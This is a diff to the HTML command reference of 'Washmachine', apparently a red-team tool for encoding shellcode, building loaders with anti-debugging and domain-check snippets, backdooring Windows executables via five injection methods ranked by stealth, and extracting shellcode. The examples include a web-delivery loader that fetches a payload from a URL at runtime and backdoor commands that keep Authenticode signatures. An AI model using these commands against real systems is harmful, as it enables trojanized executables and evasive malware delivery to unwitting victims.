@@ -30,17 +30,19 @@
             <div class="container">
                 <h1>CLI Reference</h1>
 
-                <p>The Washmachine CLI provides a comprehensive set of commands for building shellcode loaders, analyzing PE files, and backdooring executables.</p>
+                <p>The Washmachine CLI provides a comprehensive set of commands for encoding shellcode, building loaders, analyzing PE files, backdooring executables, and extracting shellcode from PE binaries.</p>
+
+                <p><strong>Tip:</strong> Run <code>washmachine-cli help --all</code> for a full scrollable reference of every command and option directly in your terminal.</p>
 
                 <h2>Usage</h2>
                 <pre><code>washmachine-cli &lt;command&gt; [options]</code></pre>
 
                 <h2>Commands</h2>
 
-                <h3>compile</h3>
-                <p>Build a shellcode loader executable.</p>
+                <h3>encode</h3>
+                <p>Encode shellcode via Bin2Shell and build a loader executable from a template. Requires exactly one shellcode source.</p>
 
-                <h4>Options</h4>
+                <h4>Shellcode Source (one required)</h4>
                 <table>
                     <thead>
                         <tr>
@@ -50,38 +52,83 @@
                     </thead>
                     <tbody>
                         <tr>
-                            <td><code>-s, --shellcode</code></td>
+                            <td><code>-s, --shellcode &lt;file&gt;</code></td>
                             <td>Path to shellcode file (.bin)</td>
                         </tr>
                         <tr>
-                            <td><code>-t, --template</code></td>
-                            <td>Template ID (default, shellcode-minimal)</td>
+                            <td><code>--shellcode-hex &lt;hex&gt;</code></td>
+                            <td>Raw hex string (e.g. <code>\xfc\x48\x83...</code>)</td>
                         </tr>
                         <tr>
-                            <td><code>-e, --encoder</code></td>
+                            <td><code>-u, --shellcode-url &lt;url&gt;</code></td>
+                            <td>URL for web delivery mode — fetches payload at runtime</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Options</h4>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Option</th>
+                            <th>Default</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>-t, --template &lt;id&gt;</code></td>
+                            <td><code>shellcode-minimal</code></td>
+                            <td>Template ID from the YAML catalog</td>
+                        </tr>
+                        <tr>
+                            <td><code>-e, --encoder &lt;index&gt;</code></td>
+                            <td><code>0</code></td>
                             <td>Encoder index (0=none, 1=XOR, 2=RC4, etc.)</td>
                         </tr>
                         <tr>
+                            <td><code>-v, --envelope &lt;index&gt;</code></td>
+                            <td><code>0</code></td>
+                            <td>Envelope index (0=none, 1=Base64, 2=Base32, etc.)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--snippet &lt;section=id&gt;</code></td>
+                            <td></td>
+                            <td>Attach a snippet to a template section (repeatable)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--verbose</code></td>
+                            <td></td>
+                            <td>Show detailed compilation output</td>
+                        </tr>
+                        <tr>
                             <td><code>--json</code></td>
+                            <td></td>
                             <td>Output result as JSON</td>
                         </tr>
                     </tbody>
                 </table>
 
                 <h4>Examples</h4>
-                <pre><code># Compile from a .bin shellcode file using the minimal template
-washmachine-cli compile -s payload.bin -t shellcode-minimal
+                <pre><code># Encode from a .bin shellcode file using the minimal template
+washmachine-cli encode -s payload.bin -t shellcode-minimal
 
-# Compile with XOR encoding, output as JSON
-washmachine-cli compile -s payload.bin -e 1 --json
+# Encode with XOR encoding and Base64 envelope, output as JSON
+washmachine-cli encode -s payload.bin -e 1 -v 1 --json
 
-# Compile with default template
-washmachine-cli compile -s payload.bin</code></pre>
+# Encode from hex string with a snippet attached
+washmachine-cli encode --shellcode-hex "\xfc\x48\x83..." --snippet anti_debugging=check_debugger
+
+# Encode with web delivery URL and verbose output
+washmachine-cli encode -u http://host/payload.bin -e 2 --verbose
+
+# Stack multiple snippets on the default template
+washmachine-cli encode -s payload.bin -t default --snippet guardrails=domain_check --snippet anti_debugging=check_debugger</code></pre>
 
                 <h3>analyze</h3>
-                <p>Analyze a PE file (headers, sections, imports, code caves).</p>
+                <p>Analyze a PE file — prints headers, sections, imports, and discovered code caves.</p>
 
-                <h4>Options</h4>
+                <h4>Arguments &amp; Options</h4>
                 <table>
                     <thead>
                         <tr>
@@ -92,7 +139,7 @@ washmachine-cli compile -s payload.bin</code></pre>
                     <tbody>
                         <tr>
                             <td><code>&lt;pe-file&gt;</code></td>
-                            <td>Path to PE file to analyze</td>
+                            <td>Path to PE file to analyze (required)</td>
                         </tr>
                         <tr>
                             <td><code>--json</code></td>
@@ -105,13 +152,13 @@ washmachine-cli compile -s payload.bin</code></pre>
                 <pre><code># Analyze a PE file
 washmachine-cli analyze target.exe
 
-# Analyze with JSON output
+# Analyze with JSON output for scripting
 washmachine-cli analyze target.exe --json</code></pre>
 
                 <h3>backdoor</h3>
-                <p>Inject shellcode into an existing PE via code-cave.</p>
+                <p>Inject shellcode into an existing PE file using one of five injection methods.</p>
 
-                <h4>Options</h4>
+                <h4>Required Options</h4>
                 <table>
                     <thead>
                         <tr>
@@ -121,23 +168,250 @@ washmachine-cli analyze target.exe --json</code></pre>
                     </thead>
                     <tbody>
                         <tr>
-                            <td><code>--pe</code></td>
+                            <td><code>--pe &lt;file&gt;</code></td>
                             <td>Path to target PE file</td>
                         </tr>
                         <tr>
-                            <td><code>-s, --shellcode</code></td>
+                            <td><code>-s, --shellcode &lt;file&gt;</code></td>
                             <td>Path to shellcode file (.bin)</td>
                         </tr>
+                    </tbody>
+                </table>
+
+                <h4>Options</h4>
+                <table>
+                    <thead>
                         <tr>
-                            <td><code>-o, --output</code></td>
-                            <td>Output path for patched PE</td>
+                            <th>Option</th>
+                            <th>Default</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>-o, --output &lt;file&gt;</code></td>
+                            <td><code>&lt;input&gt;.backdoored.exe</code></td>
+                            <td>Output path for the patched PE</td>
+                        </tr>
+                        <tr>
+                            <td><code>-m, --method &lt;method&gt;</code></td>
+                            <td><code>code-cave</code></td>
+                            <td>Injection method (see table below)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--section-name &lt;name&gt;</code></td>
+                            <td><code>.extra</code></td>
+                            <td>Name for the new section (<code>new-section</code> method)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--carrier &lt;invoke&gt;</code></td>
+                            <td><code>entry-point</code></td>
+                            <td>How shellcode is invoked at runtime</td>
+                        </tr>
+                        <tr>
+                            <td><code>--no-remove-sig</code></td>
+                            <td></td>
+                            <td>Keep the Authenticode signature (if present)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--no-patch-subsystem</code></td>
+                            <td></td>
+                            <td>Do not patch the PE subsystem field</td>
+                        </tr>
+                        <tr>
+                            <td><code>--no-patch-exit</code></td>
+                            <td></td>
+                            <td>Do not patch the exit behavior</td>
+                        </tr>
+                        <tr>
+                            <td><code>--cave-min-size &lt;n&gt;</code></td>
+                            <td></td>
+                            <td>Minimum code cave size in bytes (<code>code-cave</code> method)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--dry-run</code></td>
+                            <td></td>
+                            <td>Simulate the injection without writing output</td>
+                        </tr>
+                        <tr>
+                            <td><code>--verbose</code></td>
+                            <td></td>
+                            <td>Show detailed injection output</td>
+                        </tr>
+                        <tr>
+                            <td><code>--json</code></td>
+                            <td></td>
+                            <td>Output result as JSON</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Injection Methods</h4>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Method</th>
+                            <th>How It Works</th>
+                            <th>Stealth</th>
+                            <th>Size Limit</th>
+                            <th>Arch</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>code-cave</code></td>
+                            <td>Finds null-byte gaps in existing sections</td>
+                            <td>High — no structural changes</td>
+                            <td>Limited by cave size</td>
+                            <td>x86 / x64</td>
+                        </tr>
+                        <tr>
+                            <td><code>new-section</code></td>
+                            <td>Adds a new PE section for the payload</td>
+                            <td>Low — new entry in section table</td>
+                            <td>Unlimited</td>
+                            <td>x86 / x64</td>
+                        </tr>
+                        <tr>
+                            <td><code>section-ext</code></td>
+                            <td>Extends the last PE section</td>
+                            <td>Medium — no new header, but last section grows</td>
+                            <td>Unlimited</td>
+                            <td>x86 / x64</td>
+                        </tr>
+                        <tr>
+                            <td><code>text-pad</code></td>
+                            <td>Writes into .text VirtualSize↔RawSize padding gap</td>
+                            <td>High — no structural changes, no file size change</td>
+                            <td>Limited by padding gap</td>
+                            <td>x86 / x64</td>
+                        </tr>
+                        <tr>
+                            <td><code>tls-callback</code></td>
+                            <td>Creates a TLS callback that runs before main</td>
+                            <td>Medium — adds TLS directory entry</td>
+                            <td>Unlimited</td>
+                            <td>x64 only</td>
                         </tr>
                     </tbody>
                 </table>
 
                 <h4>Examples</h4>
-                <pre><code># Inject shellcode into an existing PE
-washmachine-cli backdoor --pe target.exe -s payload.bin -o patched.exe</code></pre>
+                <pre><code># Inject using the default code-cave method
+washmachine-cli backdoor --pe target.exe -s payload.bin
+
+# Inject via new section with a custom section name
+washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section --section-name .data2
+
+# Inject via TLS callback (x64 only)
+washmachine-cli backdoor --pe target.exe -s payload.bin -m tls-callback -o backdoored.exe
+
+# Extend the last section
+washmachine-cli backdoor --pe target.exe -s payload.bin -m section-ext
+
+# Use text padding (no file size change)
+washmachine-cli backdoor --pe target.exe -s payload.bin -m text-pad
+
+# Dry run — simulate without writing output
+washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section --dry-run --verbose
+
+# Keep Authenticode signature and output as JSON
+washmachine-cli backdoor --pe signed.exe -s payload.bin --no-remove-sig --json</code></pre>
+
+                <h3>strip</h3>
+                <p>Extract flat binary (.bin) shellcode from a PE file.</p>
+
+                <h4>Arguments &amp; Options</h4>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Option</th>
+                            <th>Default</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>&lt;pe-file&gt;</code></td>
+                            <td></td>
+                            <td>Path to PE file to strip (required)</td>
+                        </tr>
+                        <tr>
+                            <td><code>-o, --output &lt;file&gt;</code></td>
+                            <td><code>&lt;input&gt;.bin</code></td>
+                            <td>Output path for the extracted binary</td>
+                        </tr>
+                        <tr>
+                            <td><code>-m, --mode &lt;mode&gt;</code></td>
+                            <td><code>ep</code></td>
+                            <td>Extraction mode (see table below)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--section &lt;name&gt;</code></td>
+                            <td></td>
+                            <td>Section name to extract (<code>section</code> mode)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--range &lt;start:len&gt;</code></td>
+                            <td></td>
+                            <td>Byte range to extract (<code>range</code> mode)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--no-trim</code></td>
+                            <td></td>
+                            <td>Do not trim trailing null bytes from output</td>
+                        </tr>
+                        <tr>
+                            <td><code>--analyze</code></td>
+                            <td></td>
+                            <td>Print PE analysis before stripping</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Extraction Modes</h4>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Mode</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>ep</code></td>
+                            <td>Extract from the entry point section (default)</td>
+                        </tr>
+                        <tr>
+                            <td><code>section</code></td>
+                            <td>Extract a specific section by name (requires <code>--section</code>)</td>
+                        </tr>
+                        <tr>
+                            <td><code>all-exec</code></td>
+                            <td>Extract all executable sections concatenated</td>
+                        </tr>
+                        <tr>
+                            <td><code>range</code></td>
+                            <td>Extract a raw byte range (requires <code>--range</code>)</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Examples</h4>
+                <pre><code># Extract from entry point section (default)
+washmachine-cli strip loader.exe
+
+# Extract a specific section
+washmachine-cli strip loader.exe -m section --section .text -o shellcode.bin
+
+# Extract all executable sections
+washmachine-cli strip loader.exe -m all-exec
+
+# Extract a raw byte range
+washmachine-cli strip loader.exe -m range --range 0x400:512
+
+# Analyze the PE before stripping, keep trailing nulls
+washmachine-cli strip loader.exe --analyze --no-trim</code></pre>
 
                 <h3>list</h3>
                 <p>List available templates, encoders, snippets, or compilers.</p>
@@ -152,20 +426,20 @@ washmachine-cli backdoor --pe target.exe -s payload.bin -o patched.exe</code></p
                     </thead>
                     <tbody>
                         <tr>
-                            <td><code>--compilers</code></td>
-                            <td>List discovered compilers</td>
-                        </tr>
-                        <tr>
                             <td><code>--templates</code></td>
-                            <td>List available templates</td>
+                            <td>List available templates from the YAML catalog</td>
                         </tr>
                         <tr>
                             <td><code>--encoders</code></td>
-                            <td>List available encoders</td>
+                            <td>List available encoders from Bin2Shell</td>
                         </tr>
                         <tr>
                             <td><code>--snippets</code></td>
-                            <td>List available code snippets</td>
+                            <td>List available code snippets by section</td>
+                        </tr>
+                        <tr>
+                            <td><code>--compilers</code></td>
+                            <td>List discovered C++ compilers on the system</td>
                         </tr>
                     </tbody>
                 </table>
@@ -281,7 +555,7 @@ washmachine-cli test --phase 3 --test-assets "testing assets\binary\shellcodes"<
                 <h2>JSON Output Format</h2>
                 <p>When using the <code>--json</code> flag, commands output structured JSON for easy parsing:</p>
 
-                <h3>Compile Command</h3>
+                <h3>Encode Command</h3>
                 <pre><code>{
   "success": true,
   "message": "Compilation successful",
